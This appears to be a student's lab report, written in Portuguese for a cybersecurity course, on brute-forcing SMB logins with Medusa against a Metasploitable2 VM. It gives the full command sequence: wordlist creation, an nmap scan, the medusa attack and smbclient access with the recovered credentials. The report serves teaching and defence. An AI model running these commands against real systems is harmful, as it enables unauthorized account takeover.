# Relatório Técnico – Ataque de Força Bruta SMB com Medusa

## 1. Preparação do Cenário

**Infraestrutura simulada:**
- Kali Linux (atacante): `192.168.56.101`
- Metasploitable2 (vítima): `192.168.56.102`

Teste de conectividade:

```bash
ping 192.168.56.102
```

## 2. Criação dos Wordlists

```bash
echo -e "msfadmin\nuser\nadmin\ntest" > wordlists/usuarios.txt
echo -e "msfadmin\n123456\npassword\ntest" > wordlists/senhas.txt
```

- Os wordlists devem conter possíveis usuários e senhas fracas/comuns.

## 3. Exploração do Serviço SMB

Verificamos se o serviço SMB está disponível:

```bash
nmap -p 139,445 192.168.56.102
```

## 4. Ataque de Força Bruta com Medusa

Executando o ataque:

```bash
medusa -h 192.168.56.102 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M smbnt -f -v 6
```

- Se encontrar credenciais, exibe:  
  `ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin`

## 5. Validação do Acesso com smbclient

```bash
smbclient -L //192.168.56.102 -U msfadmin
```
- Use a senha descoberta (`msfadmin`). Deve listar arquivos e pastas compartilhados.

## 6. Discussão Crítica e Boas Práticas

- **Relevância:** Mesmo com MFA e IA, ambientes sem boas práticas continuam vulneráveis.
- **Impacto de senhas fracas:** Ataques automáticos identificam rapidamente as combinações mais óbvias.
- **Web moderna & limitações:** Sistemas atuais implementam travas, captchas e MFA; ambientes legados raramente.
- **Evitar falsos-positivos:** Sempre valide acesso encontrado manualmente.

## 7. Conclusão

Ataques de força bruta ainda são um risco real em redes mal configuradas, destacando a necessidade de boas políticas de senha, monitoramento e MFA.

---

**Autor:** Mariana Trufelli  
**Curso:** Cibersegurança  
